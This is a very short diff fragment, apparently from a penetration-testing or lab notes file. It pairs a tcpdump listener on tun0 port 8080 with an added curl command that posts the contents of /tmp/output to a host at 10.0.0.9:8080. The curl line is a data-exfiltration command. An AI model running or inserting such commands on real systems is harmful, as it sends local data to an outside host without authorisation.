@@ -1,1 +1,3 @@
 sudo tcpdump -nvvvXi tun0 tcp port 8080
+
+curl --data @/tmp/output http://10.0.0.9:8080/
